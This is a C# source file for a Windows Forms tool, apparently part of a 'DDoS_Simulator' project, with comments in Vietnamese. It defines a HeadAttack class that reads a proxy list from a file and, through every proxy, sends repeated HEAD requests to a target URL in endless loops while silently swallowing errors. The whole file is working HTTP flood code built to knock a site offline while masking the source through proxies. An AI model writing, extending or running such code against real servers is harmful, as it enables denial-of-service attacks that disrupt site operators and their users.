using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Collections.Generic; // Đảm bảo dòng này được bao gồm
using DDoS_Simulator;

    public class HeadAttack
    {
        private readonly string targetUrl; // Địa chỉ URL mục tiêu
        private readonly string proxyPath; // Đường dẫn đến tệp chứa danh sách proxy
        private readonly int multiple; // Số lượng yêu cầu gửi
        private readonly ListBox statusListBox; // Danh sách để hiển thị trạng thái

        public HeadAttack(string targetUrl, string proxyPath, int multiple, ListBox statusListBox)
        {
            this.targetUrl = targetUrl;
            this.proxyPath = proxyPath;
            this.multiple = multiple;
            this.statusListBox = statusListBox;
        }

        public async Task ExecuteAttack(CancellationToken cancellationToken)
        {
            var proxies = File.ReadAllLines(proxyPath).ToList(); // Tải danh sách proxy từ tệp
            var tasks = new List<Task>(); // Tạo danh sách để chứa các tác vụ

            foreach (var proxy in proxies)
            {
                tasks.Add(Task.Run(async () =>
                {
                    while (!cancellationToken.IsCancellationRequested) // Kiểm tra xem có yêu cầu dừng không
                    {
                        try
                        {
                            string[] parts = proxy.Split(':'); // Tách địa chỉ proxy
                            if (parts.Length != 2) return; // Kiểm tra định dạng proxy hợp lệ

                            var handler = new HttpClientHandler
                            {
                                Proxy = new WebProxy(parts[0], int.Parse(parts[1])), // Thiết lập proxy
                                UseProxy = true,
                            };

                            using (var client = new HttpClient(handler))
                            {
                                // Phóng đại bằng cách gửi nhiều yêu cầu HEAD trong mỗi vòng lặp
                                for (int i = 0; i < multiple; i++)
                                {
                                    var requestMessage = new HttpRequestMessage(HttpMethod.Head, targetUrl);
                                    var response = await client.SendAsync(requestMessage, cancellationToken);

                                    if (response.IsSuccessStatusCode)
                                    {
                                        // Cập nhật danh sách trạng thái
                                        UpdateStatus($"Gửi HEAD request thành công qua proxy: {proxy}");
                                    }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            
                        }
                    }
                }));
            }

            // Chờ tất cả các tác vụ hoàn thành
            await Task.WhenAll(tasks);
        }

        private void UpdateStatus(string message)
        {
            // Cập nhật trạng thái trên giao diện người dùng
            if (statusListBox.InvokeRequired)
            {
                statusListBox.Invoke(new Action(() => statusListBox.Items.Add(message)));
            }
            else
            {
                statusListBox.Items.Add(message);
            }
        }
    }